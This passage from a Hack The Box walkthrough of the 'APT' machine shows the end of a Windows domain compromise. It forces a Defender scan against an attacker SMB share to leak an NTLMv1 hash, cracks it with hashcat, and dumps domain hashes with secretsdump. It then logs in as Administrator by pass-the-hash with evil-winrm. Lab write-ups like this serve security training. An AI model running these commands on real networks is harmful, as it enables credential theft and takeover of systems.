cd 'Windows Defender'
.\MpCmdRun.exe
#   ---> For scanning files and other things

.\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.6\oldboywashere
```

<br />
<img src="{{ site.img_path }}/apt_writeup/APT_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_66.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_67.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_68.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have the **NTLMv1** hash encrypted, I can use the **[crack.sh](https://crack.sh/){:target="_blank"}** page to break it, but first I have to adjust the format so that this site understands it, so I will use the **[ntlmv1.py](https://github.com/evilmog/ntlmv1-multi){:target="_blank"}** script to make the adjustment and break the hash. Unfortunately the tool is not functional on the web site, but I can turn to **[Wayback Machine](https://wayback-api.archive.org/){:target="_blank"}** to see if there is a **snapshot** available that will allow me to send my hash. I get lucky and on a date in the year **2022** I find one, now if the online tool is going to help me decrypt the **NTLMv1** hash, I just need to create a temporary email in **[tempail.com](https://tempail.com/en){:target="_blank"}**  where to receive the hash once the work done by **[crack.sh](https://crack.sh/){:target="_blank"}** is finished.

```bash
wget https://raw.githubusercontent.com/evilmog/ntlmv1-multi/master/ntlmv1.py
python3 ntlmv1.py --ntlmv1 APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
#   --> :)
```

<br />
<img src="{{ site.img_path }}/apt_writeup/APT_69.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_70.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_71.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_72.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_73.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_74.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_75.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_76.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_77.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since the response I'm waiting for takes longer than expected, I'm going to use `hashcat` to break the hash (once I've [fixed some issues with the **charset**](https://hashcat.net/forum/thread-11104.html){:target="_blank"}). Now I can try to dump the hashes of all Domain users with `impacket-secretsdump` and I succeed. I just have to validate if the credentials are valid with `crackmapexec` and I have the **TOC** to also check that it can connect with **WinRM** (it is the **Administrator** user, **who crazy would not allow it!**). I re-create a session with `evil-winrm` (performing a **Pass The Hash attack**) and I can already access the last flag, **pwned box**.

> The [**Directory Replication Service** (**DRS**) **Remote Protocol**](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/06205d97-30da-4fdc-a276-3fd831b272e0){:target="_blank"} is an RPC protocol for replication and management of data in **Active Directory**. The protocol consists of two **RPC** interfaces named **drsuapi** and **dsaop**. The name of each **drsuapi** method begins with "IDL_DRS", while the name of each **dsaop** method begins with "IDL_DSA".

> **Pass the hash** (**PtH**) is a type of cybersecurity attack in which an adversary steals a “hashed” user credential and uses it to create a new user session on the same network.

```bash
echo "95ACA8C7248774CB:1122334455667788" >> 14000.hash
echo "427E1AE5B8D5CE68:1122334455667788" >> 14000.hash
hashcat -m 14000 -a 3 -1 /usr/share/hashcat/charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1
#   --> Invalid hex character detected in mask /usr/share/hashcat/charsets/DES_full.charset     :(

hashcat -m 14000 -a 3 -1 /usr/share/hashcat/charsets/DES_full.hcchr --hex-charset 14000.hash ?1?1?1?1?1?1?1?1  # :)
# --> Key: d167c3238864b12f5f82feae86a7f798

impacket-secretsdump --help
#   --> Performs various techniques to dump secrets from the remote machine without executing any agent there.
#   --> hashes LMHASH:NTHASH               NTLM hashes, format is LMHASH:NTHASH

impacket-secretsdump -hashes :d167c3238864b12f5f82feae86a7f798 'apt/APT$@htb.local'       # :(
impacket-secretsdump -hashes :d167c3238864b12f5f82feae86a7f798 'apt/APT$@apt'             # :(
#   --> target:  [[domain/]username[:password]@]<targetName or address>    <-- Remember 
impacket-secretsdump -hashes :d167c3238864b12f5f82feae86a7f798 'htb.local/APT$@apt'       # :)

crackmapexec smb apt -u 'Administrator' -H 'c370bddf384a691d811ff3495e8a72e2'
crackmapexec winrm apt -u 'Administrator' -H 'c370bddf384a691d811ff3495e8a72e2'
evil-winrm -i apt -u 'Administrator' -H 'c370bddf384a691d811ff3495e8a72e2'

whoami
#   --> htb\administrator
```

<br />
<img src="{{ site.img_path }}/apt_writeup/APT_78.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_79.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/apt_writeup/APT_80.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> It is incredible that not long ago I did not allow myself to hack **Windows** machines, due to my total ignorance of the handling of this **Operating System**, and with the passage of time and with each **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** that I am doing I like much more to face this kind of challenges. I will continue a couple more boxes and then pivot back to a **Linux** machine or perhaps other types of challenges, such as **Cloud** or **Mobile**, but always practicing and assimilating new concepts, hacking never rests. **I must kill the box**.

<br /><br />
<img src="{{ site.img_path }}/apt_writeup/APT_81.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
